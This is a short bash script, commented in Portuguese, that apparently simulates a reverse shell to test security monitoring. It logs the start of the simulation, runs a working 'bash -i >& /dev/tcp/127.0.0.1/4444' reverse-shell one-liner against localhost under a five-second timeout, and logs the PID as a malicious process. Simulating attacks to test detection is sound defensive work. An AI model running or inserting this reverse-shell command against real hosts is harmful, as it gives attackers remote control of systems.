#!/bin/bash
source ./common.cfg
log_event "INICIANDO: Simulação de Reverse Shell"
echo "Tentando conexão reversa para localhost:4444..."
# Timeout rápido para não travar
timeout 5 bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" 2>/dev/null &
PID=$!
log_event "Processo malicioso iniciado (PID: $PID)"
sleep 2
log_event "CONCLUÍDO: Conexão encerrada."
